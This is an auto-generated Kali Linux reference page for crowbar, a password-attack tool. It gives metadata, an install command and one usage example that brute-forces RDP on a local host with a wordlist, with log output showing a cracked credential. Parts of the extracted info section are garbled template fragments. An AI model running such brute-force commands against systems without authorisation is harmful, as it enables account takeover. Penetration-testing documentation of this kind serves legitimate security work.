---
tool_id: crowbar
title: crowbar
categories: ["password-attacks"]
category_slugs: ["password-attacks"]
homepage: https://github.com/galkan/crowbar
repository: 
version: 4.2-0kali3
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-everything"]
icon: /images/kali-tools-icon-missing.svg
source_path: kali-tools\crowbar\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.855840
---

# Tool: crowbar (crowbar)

## Categories
- [password-attacks](../password-attacks.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/galkan/crowbar](https://github.com/galkan/crowbar) |
| Repository |  |
| Version | 4.2-0kali3 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything |
| Icon | /images/kali-tools-icon-missing.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/crowbar
- **PackagesInfo**: |
- **Currently Crowbar supports**: []
- ****Installed size**: ** `450 KB`
- ****How to install**: ** `sudo apt install crowbar`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# crowbar -h
- **usage**: Usage: use --help for further information
- **positional arguments**: []
- **options**: []


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## crowbar Usage Examples

Brute force the RDP service on a single host with a specified username and wordlist, using 1 thread.

```console
root@kali:~# crowbar -b rdp -s 192.168.86.61/32 -u victim -C /root/words.txt -n 1
2017-10-10 14:59:55 START
2017-10-10 14:59:55 Crowbar v0.3.5-dev
2017-10-10 14:59:55 Trying 192.168.86.61:3389
2017-10-10 15:00:08 RDP-SUCCESS : 192.168.86.61:3389 - victim:s3cr3t
2017-10-10 15:00:08 STOP
```


## Source
- Path: kali-tools\crowbar\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.855840
